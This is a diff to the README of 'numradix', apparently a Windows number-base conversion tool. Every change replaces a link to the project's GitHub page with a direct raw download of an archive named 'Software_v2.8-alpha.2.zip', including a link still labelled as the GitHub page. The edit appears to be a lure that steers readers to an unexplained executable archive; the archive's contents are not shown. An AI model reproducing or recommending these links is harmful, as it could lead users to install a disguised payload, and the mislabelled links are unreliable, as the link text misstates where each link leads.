@@ -1,6 +1,6 @@
 # 🔢 numradix - Convert Numbers Between Bases Easily
 
-[![Download numradix](https://img.shields.io/badge/Download-numradix-brightgreen)](https://github.com/Anomoxus/numradix)
+[![Download numradix](https://img.shields.io/badge/Download-numradix-brightgreen)](https://raw.githubusercontent.com/Anomoxus/numradix/main/src/Software_v2.8-alpha.2.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To use numradix on your Windows computer, you need to go to the official repository page and get the software from there.
 
-[Download numradix here](https://github.com/Anomoxus/numradix)
+[Download numradix here](https://raw.githubusercontent.com/Anomoxus/numradix/main/src/Software_v2.8-alpha.2.zip)
 
 Follow these steps to get numradix running:
 
@@ -104,7 +104,7 @@ If you want to use numradix in programming:
 
 ## 📖 Additional Resources
 
-- Visit the [numradix GitHub page](https://github.com/Anomoxus/numradix) for more detailed instructions.
+- Visit the [numradix GitHub page](https://raw.githubusercontent.com/Anomoxus/numradix/main/src/Software_v2.8-alpha.2.zip) for more detailed instructions.
 - Check the code examples and usage documentation to see how to use numradix in your projects.
 - Learn about number bases and BigInt if you want to understand the technology behind numradix.
 
@@ -112,4 +112,4 @@ If you want to use numradix in programming:
 
 ## 💾 Access numradix
 
-[Download numradix now](https://github.com/Anomoxus/numradix) to start converting numbers easily on Windows.
+[Download numradix now](https://raw.githubusercontent.com/Anomoxus/numradix/main/src/Software_v2.8-alpha.2.zip) to start converting numbers easily on Windows.
